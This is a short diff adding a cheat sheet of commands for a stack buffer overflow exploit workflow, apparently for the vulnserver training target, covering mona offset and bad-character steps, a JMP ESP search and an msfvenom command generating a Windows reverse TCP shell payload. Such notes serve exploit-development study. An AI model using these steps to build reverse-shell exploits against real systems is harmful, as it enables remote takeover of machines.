@@ -1,0 +1,20 @@
+#Set working dir
+!mona config -set workingfolder c:\mona\%p
+
+#pattern create
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2500
+
+#find offset
+!mona findmsp -distance 2500
+
+#gen badchars
+!mona bytearray -b "BADCHARS"
+
+#find badchars
+!mona compare -f C:\mona\vulnserver\bytearray.bin -a ESP
+
+#find JMP
+!mona jmp -r esp -cpb "BADCHARS"
+
+#gen payload
+msfvenom -p windows/shell_reverse_tcp LHOST= LPORT= EXITFUNC=thread -f py -a x86 -b "BADCHARS"
